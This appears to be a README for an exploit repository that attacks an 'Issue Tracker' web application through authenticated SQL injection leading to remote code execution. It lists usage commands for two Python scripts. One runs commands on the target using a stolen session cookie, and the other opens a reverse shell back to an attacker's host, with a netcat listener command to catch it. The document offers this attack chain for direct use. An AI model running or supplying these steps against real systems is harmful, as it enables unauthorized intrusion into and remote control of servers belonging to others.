# Issue Tracker Authenticated Remote Code Execution Via SQL Injection

## RCE
#### Usage
```bash
python3 issue_rce.py <target_ip> <jessionid_cookie>
```
## Reverse Shell
#### Usage
```bash
python3 issue_rev.py <target_ip> <jsessionid_cookie> <lhost> <lport>
```
#### Usage: Listener
```bash
nc -lvnp <lport>
```
